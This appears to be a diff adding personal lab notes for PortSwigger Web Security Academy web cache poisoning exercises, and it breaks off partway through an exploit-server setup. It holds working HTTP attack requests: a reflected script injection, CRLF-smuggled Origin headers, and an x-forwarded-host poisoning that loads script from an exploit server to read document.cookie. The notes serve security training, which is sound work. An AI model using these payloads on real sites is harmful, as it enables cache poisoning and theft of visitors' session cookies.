@@ -676,8 +676,92 @@ https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementati
 
 To solve the lab, combine the vulnerabilities to execute alert(1) in the victim's browser. Note that you will need to make use of the Pragma: x-get-cache-key header in order to solve this lab. 
 
+I think it was supposed to be harder... but this payload works:
+(try it first with dynamic cash buster to make sure it works and then poison cache)
+
+    GET /?utm_content='><script>alert(1)</script>// HTTP/1.1
+    Host: 0af700d2031c6da3c0664a07000100a2.web-security-academy.net
+    Cookie: session=HylSBu4j0pN256iOEuD6a0mrqYhl6A2J
+    Pragma: x-get-cache-key
+
+<!-- lets try the harder Portswiggers solution for fun:
+    GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1
+    pragma: x-get-cache-key
+    Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
+
+    GET /login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1
+    Host: 0a1700ed03731ea3c0e55b1c0062002e.web-security-academy.net
+    Cookie: session=u8tkkPW5TxlcoDOcfOB8KBCMXyfQRHW4; lang=en
+    Content-Length: 0
+
+it doesnt work well... TBC     -->
 
 
 
 
+# ***7. Lab: Internal cache poisoning***
+https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal
+
+To solve the lab, poison the internal cache so that the home page executes alert(document.cookie) in the victim's browser. 
+
+1st telltale: when Dynamic cashbuster enabled - we see that a *set-cookie* header is added to response:
+    Set-Cookie: session=Y4ypG08X0NdCC42hKFMZuIh8eqgKqnqX; Secure; HttpOnly; SameSite=None
+while when the dynamic CB disabled we see this only on the first (cached) response and not the following one.
+
+observe that x-forwarded-host header yields different response when value change.
+
+
+
+
+> **GET / HTTP/1.1**
+
+       <script src=//0ae900370380c1a8c0546fd900fd008e.web-security-academy.net/js/geolocate.js?callback=loadCountry></script>
+
+
+        <script type="text/javascript" src="//0ae900370380c1a8c0546fd900fd008e.web-security-academy.net/resources/js/analytics.js"></script>
+
+
+> **GET /js/geolocate.js?callback=loadCountry HTTP/1.1**
+
+    const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
+    const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
+    loadCountry({"country":"United Kingdom"});
+
+
+> **GET /analytics?id=dsCaXDLjgQfu8mr8 HTTP/1.1**
+
+
+
+**1st POP:**
+
+GET / HTTP/1.1
+Host: 0ae900370380c1a8c0546fd900fd008e.web-security-academy.net
+Cookie: session=noiXwQNM55JxNbWSwZZjLWavDqcqH9BP
+x-forwarded-Host: exploit-0abc000c033ac1bcc0ac6f1501150018.exploit-server.net
+
+2. POP:
+
+GET / HTTP/1.1
+Host: 0ae900370380c1a8c0546fd900fd008e.web-security-academy.net
+x-forwarded-Host: x" onerror=alert(1)></script>//
+
+we get a hit in server when we use:
+GET / HTTP/1.1
+Host: 0a87000a046c84c1c0c0c46700e20051.web-security-academy.net
+x-forwarded-host: exploit-0ae800d004a88487c09dc41d016500bf.exploit-server.net
+
+**final payload:**
+GET /js/geolocate.js?callback=loadCountry&utm_contest=22&callback=alert(document.cookie)// HTTP/1.1
+Host: 0a87000a046c84c1c0c0c46700e20051.web-security-academy.net
+Content-Length: 0
+x-forwarded-host: exploit-0ae800d004a88487c09dc41d016500bf.exploit-server.net
+
+**exploit server**:
+file:
+> /js/geolocate.js
+Head:> HTTP/1.1 200 OK
+Content-Type: application/javascript; charset=utf-8
+Body:
+HTTP/1.1 200 OK
+Content-Type: application/javascript; charset=utf-8
 
